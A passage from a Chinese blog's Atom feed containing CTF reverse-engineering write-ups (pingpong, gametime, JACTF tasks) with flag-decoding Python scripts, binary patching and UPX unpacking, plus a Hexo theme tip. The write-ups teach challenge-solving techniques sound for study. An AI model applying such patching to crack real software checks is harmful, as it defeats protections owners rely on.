class="number">7</span>) &#123;</span><br><span class="line">                    num = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (tt == <span class="number">0</span>) &#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">"BCTF&#123;MagicNum"</span> + Integer.toString(p) + <span class="string">"&#125;"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                tt--;</span><br><span class="line">                p = ping(p, num);</span><br><span class="line">                num++;</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">                    num = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (tt == <span class="number">0</span>) &#123;</span><br><span class="line">                    Log.d(TAG, <span class="string">"BCTF&#123;MagicNum"</span> + Integer.toString(p) + <span class="string">"&#125;"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/images/pasted-89.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>so库移植使用起来，真是能够减少对so层代码的研究，节省时间</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/</a><br><a href="https://blog.csdn.net/JasaLee/article/details/70242837" target="_blank" rel="noopener">https://blog.csdn.net/JasaLee/article/details/70242837</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;示例程序&quot;&gt;&lt;a href=&quot;#示例程序&quot; class=&quot;headerlink&quot; title=&quot;示例程序&quot;&gt;&lt;/a&gt;示例程序&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;攻防世界 pingpong&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;jadx&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="android" scheme="https://bufsnake.github.io/categories/android/"/>
    
    
      <category term="android" scheme="https://bufsnake.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>attackworld-gametime</title>
    <link href="https://bufsnake.github.io/attackworld-gametime.html"/>
    <id>https://bufsnake.github.io/attackworld-gametime.html</id>
    <published>2019-08-13T07:09:35.000Z</published>
    <updated>2019-08-13T07:31:16.724Z</updated>
    
    <content type="html"><![CDATA[<h3 id="gametime"><a href="#gametime" class="headerlink" title="gametime"></a>gametime</h3><p><img src="/images/pasted-78.png" alt="upload successful"></p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><blockquote><p>定位主函数<br><img src="/images/pasted-79.png" alt="upload successful"></p></blockquote><p><img src="/images/pasted-80.png" alt="upload successful"></p><blockquote><p>打开程序看看</p></blockquote><p><img src="/images/pasted-81.png" alt="upload successful"></p><blockquote><p>玩几局发现，程序这游戏就行天天炫舞一样，只不过，我们输错了，它就会退出</p></blockquote><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><blockquote><p>既然我们输入的不对就会退出，那不如，我们输入对的就会退出，修改代码<br>sub_1381435<br><img src="/images/pasted-82.png" alt="upload successful"><br>sub_1381507<br><img src="/images/pasted-83.png" alt="upload successful"><br>两函数虽然一样，但是是不同的函数，只修改一个达不到效果</p></blockquote><h3 id="运行破解之后的程序"><a href="#运行破解之后的程序" class="headerlink" title="运行破解之后的程序"></a>运行破解之后的程序</h3><blockquote><p>在需要输入的地方按下回车键就行了</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TideSec\Desktop\ctf&gt;gametime.exe</span><br><span class="line">        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">        ZOMGZOMG                                ZOMGZOMG</span><br><span class="line">        ZOMGZOMG     TAP TAP REVOLUTION!!!!!!!  ZOMGZOMG</span><br><span class="line">        ZOMGZOMG                                ZOMGZOMG</span><br><span class="line">        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                      R U READDY?!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The game is starting <span class="keyword">in</span>...</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line">When you see an <span class="string">'s'</span>, press the space bar</span><br><span class="line"></span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">..........s</span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line">When you see an <span class="string">'x'</span>, press the <span class="string">'x'</span> key</span><br><span class="line"></span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">........x</span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line"></span><br><span class="line">When you see an <span class="string">'m'</span>, press the <span class="string">'m'</span> key</span><br><span class="line"></span><br><span class="line">ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">.....m</span><br><span class="line">TRAINING COMPLETE!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Now you know everything you need to know....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> the rest of your life!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LETS PLAY !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">Get ready to play</span><br><span class="line">.....s</span><br><span class="line">..x</span><br><span class="line">.m</span><br><span class="line">ooooh, you fancy!!!</span><br><span class="line">.....m</span><br><span class="line">..x</span><br><span class="line">.s</span><br><span class="line">key is not (NIIICE JOB)!!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.....m</span><br><span class="line">...s</span><br><span class="line">.....m</span><br><span class="line">...s</span><br><span class="line">....x</span><br><span class="line">.....m</span><br><span class="line">...s</span><br><span class="line">...s</span><br><span class="line">...s</span><br><span class="line">....x</span><br><span class="line">TURBO TIME!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key is  (no5c30416d6cf52638460377995c6a8cf5)</span><br><span class="line"></span><br><span class="line">.m                               )(</span><br><span class="line">.x                               )(</span><br><span class="line">.m                               )(</span><br></pre></td></tr></table></figure><blockquote><p>key就是要找的flag</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;gametime&quot;&gt;&lt;a href=&quot;#gametime&quot; class=&quot;headerlink&quot; title=&quot;gametime&quot;&gt;&lt;/a&gt;gametime&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-78.png&quot; alt=&quot;upload s
      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="gametime" scheme="https://bufsnake.github.io/tags/gametime/"/>
    
  </entry>
  
  <entry>
    <title>hexo next 7.xx添加背景图片</title>
    <link href="https://bufsnake.github.io/hexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html"/>
    <id>https://bufsnake.github.io/hexo-next-7-xx添加背景图片.html</id>
    <published>2019-08-13T04:35:51.000Z</published>
    <updated>2019-08-13T07:31:49.516Z</updated>
    
    <content type="html"><![CDATA[<h3 id="主题配置文件-config-yml"><a href="#主题配置文件-config-yml" class="headerlink" title="主题配置文件_config.yml"></a>主题配置文件_config.yml</h3><blockquote><p>找到custom_file_path，将如图所示的代码取消注释<br><img src="/images/pasted-74.png" alt="upload successful"></p></blockquote><h3 id="站点根目录"><a href="#站点根目录" class="headerlink" title="站点根目录"></a>站点根目录</h3><blockquote><p>新建文件source/_data/style.styl<br><img src="/images/pasted-76.png" alt="upload successful"></p></blockquote><h3 id="输入相关代码"><a href="#输入相关代码" class="headerlink" title="输入相关代码"></a>输入相关代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line">body &#123;</span><br><span class="line">      background: url(https:<span class="comment">//source.unsplash.com/random/1600x900?wallpapers);//自己喜欢的图片地址</span></span><br><span class="line">      background-size: cover;</span><br><span class="line">      background-repeat: no-repeat;</span><br><span class="line">      background-attachment: fixed;</span><br><span class="line">      background-position: <span class="number">50</span>% <span class="number">50</span>%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改主体透明度</span></span><br><span class="line">.main-inner &#123;</span><br><span class="line">      background: #fff;</span><br><span class="line">      opacity: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改菜单栏透明度</span></span><br><span class="line">.header-inner &#123;</span><br><span class="line">      opacity: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/images/pasted-77.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;主题配置文件-config-yml&quot;&gt;&lt;a href=&quot;#主题配置文件-config-yml&quot; class=&quot;headerlink&quot; title=&quot;主题配置文件_config.yml&quot;&gt;&lt;/a&gt;主题配置文件_config.yml&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
    
    
      <category term="hexo" scheme="https://bufsnake.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>jactf-reverse2</title>
    <link href="https://bufsnake.github.io/jactf-reverse2.html"/>
    <id>https://bufsnake.github.io/jactf-reverse2.html</id>
    <published>2019-08-12T11:45:29.000Z</published>
    <updated>2019-08-16T10:42:22.136Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简单的逻辑"><a href="#简单的逻辑" class="headerlink" title="简单的逻辑"></a>简单的逻辑</h3><p><img src="/images/pasted-50.png" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-51.png" alt="upload successful"></p><blockquote><p>关键函数<br><img src="/images/pasted-52.png" alt="upload successful"></p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: flag = list(<span class="string">"GEV\odzchpc03"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: s = <span class="string">""</span></span><br><span class="line">   ...: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">   ...:     <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">   ...:         s += chr(ord(flag[i])^<span class="number">3</span>)</span><br><span class="line">   ...:     <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">   ...:         s += chr((ord(flag[i])^<span class="number">3</span>)<span class="number">-1</span>)</span><br><span class="line">   ...:     <span class="keyword">elif</span> i%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">   ...:         s += chr((ord(flag[i])^<span class="number">3</span>)<span class="number">-2</span>)</span><br><span class="line">   ...: <span class="keyword">print</span> s</span><br><span class="line">   ...:</span><br><span class="line">DES_key_is_10</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snake~:./re</span><br><span class="line">Please input your flag:</span><br><span class="line">DES_key_is_10</span><br><span class="line">you got it!</span><br><span class="line">GEV\odzchpc03<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>可以得到是des加密，key为10</p></blockquote><blockquote><p>查看密文是啥</p></blockquote><p><img src="/images/pasted-107.png" alt="upload successful"></p><blockquote><p>解密</p></blockquote><p><img src="/images/pasted-108.png" alt="upload successful"><br><a href="https://tool.oschina.net/encrypt" target="_blank" rel="noopener">解密网站</a></p><h3 id="真假flag"><a href="#真假flag" class="headerlink" title="真假flag"></a>真假flag</h3><p><img src="/images/pasted-53.png" alt="upload successful"></p><blockquote><p>数学菜鸟在线百度查了下如何求多项式的最大公因式，说是用到了辗转相除法(欧几里得算法),但是好久都没学数学了<br><img src="/images/pasted-70.png" alt="upload successful"></p></blockquote><blockquote><p>在隔壁老阿姨的帮助下，化简了第二个式子<br>g(x) = x^3 + x^2 + x +1<br>     = x^2(x+1) + (x+1)<br>     = (x^2 + 1)(x+1)<br>由于第一个公式化简太繁琐，得到解压密码(x+1)</p></blockquote><h4 id="ida-1"><a href="#ida-1" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-71.png" alt="upload successful"></p><p><img src="/images/pasted-72.png" alt="upload successful"></p><p><img src="/images/pasted-73.png" alt="upload successful"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = list(<span class="string">"lfkmq:b+C~neoyd-~yoog~eho~boxcmb~kdy&#125;oxw"</span>)</span><br><span class="line">two = list(<span class="string">"y0y/|hka~ko??ajtoi"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">    flag[i] = chr(ord(flag[i])^<span class="number">0xA</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(two)):</span><br><span class="line">    two[i] = chr((ord(two[i])^<span class="number">7</span>)<span class="number">-7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> two)</span><br></pre></td></tr></table></figure><h3 id="Electroacoustic"><a href="#Electroacoustic" class="headerlink" title="Electroacoustic"></a>Electroacoustic</h3><p><img src="/images/pasted-59.png" alt="upload successful"></p><h4 id="upx-脱壳"><a href="#upx-脱壳" class="headerlink" title="upx 脱壳"></a>upx 脱壳</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">☁  jactf  upx -d run</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    913048 &lt;-    402252   44.06%   linux/amd64   run</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="/images/pasted-60.png" alt="upload successful"></p><blockquote><p>主要是标注的四个函数,根据函数进行构造输入</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">snake~:./run</span><br><span class="line">1th input:aaaa</span><br><span class="line">2th input:43806</span><br><span class="line">3th input:978</span><br><span class="line">4th input:we11d0ne!</span><br><span class="line">Get your key:faded</span><br></pre></td></tr></table></figure><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p><img src="/images/pasted-54.png" alt="upload successful"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">☁  jactf  file <span class="built_in">source</span></span><br><span class="line"><span class="built_in">source</span>: PE32 executable (console) Intel 80386 Mono/.Net assembly, <span class="keyword">for</span> MS Windows</span><br></pre></td></tr></table></figure></p><h4 id="dnSpy"><a href="#dnSpy" class="headerlink" title="dnSpy"></a>dnSpy</h4><p><img src="/images/pasted-55.png" alt="upload successful"></p><blockquote><p>定位主函数</p></blockquote><p><img src="/images/pasted-56.png" alt="upload successful"></p><p><img src="/images/pasted-57.png" alt="upload successful"></p><p><img src="/images/pasted-58.png" alt="upload successful"></p><blockquote><p>主要流程：将输入的字符串进行加密后与key2进行比较</p></blockquote><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key1 = list(<span class="string">"flag&#123;Thi3_i3+A_wrong+str&#125;"</span>)</span><br><span class="line">key2 = [<span class="number">24</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">23</span>,<span class="number">66</span>,<span class="number">172</span>,<span class="number">49</span>,<span class="number">34</span>,<span class="number">246</span>,<span class="number">240</span>,<span class="number">25</span>,<span class="number">27</span>,<span class="number">224</span>,<span class="number">88</span>,<span class="number">253</span>,<span class="number">50</span>,<span class="number">254</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">31</span>,<span class="number">84</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">79</span>,<span class="number">117</span>,<span class="number">238</span>]</span><br><span class="line">seed = <span class="number">7</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(key2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> key2[i] == (j + seed ^ ord(key1[seed])) &amp; <span class="number">0xff</span>:</span><br><span class="line">            seed = (seed+<span class="number">1</span>)%<span class="number">25</span></span><br><span class="line">            flag +=chr(<span class="number">0x7f</span> &amp; j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h3><p><img src="/images/pasted-61.png" alt="upload successful"></p><h4 id="ida-2"><a href="#ida-2" class="headerlink" title="ida"></a>ida</h4><blockquote><p>将关键跳转修改成如下图所示<br><img src="/images/pasted-64.png" alt="upload successful"><br><img src="/images/pasted-63.png" alt="upload successful"><br><img src="/images/pasted-62.png" alt="upload successful"><br>动态调试即可得到flag</p></blockquote><h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p><img src="/images/pasted-66.png" alt="upload successful"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="/images/pasted-65.png" alt="upload successful"></p><blockquote><p>一共两个图片，看了一下文件的内容，可以看出来要分析第二张图片<br><img src="/images/pasted-67.png" alt="upload successful"></p></blockquote><p><img src="/images/pasted-68.png" alt="upload successful"></p><blockquote><p>可以在详细信息的备注里看到js的颜文字，直接浏览器</p></blockquote><p><img src="/images/pasted-69.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>没有目标的明天，是元气满满的一天</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简单的逻辑&quot;&gt;&lt;a href=&quot;#简单的逻辑&quot; class=&quot;headerlink&quot; title=&quot;简单的逻辑&quot;&gt;&lt;/a&gt;简单的逻辑&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-50.png&quot; alt=&quot;upload successful&quot;&gt;&lt;
      
    
    </summary>
    
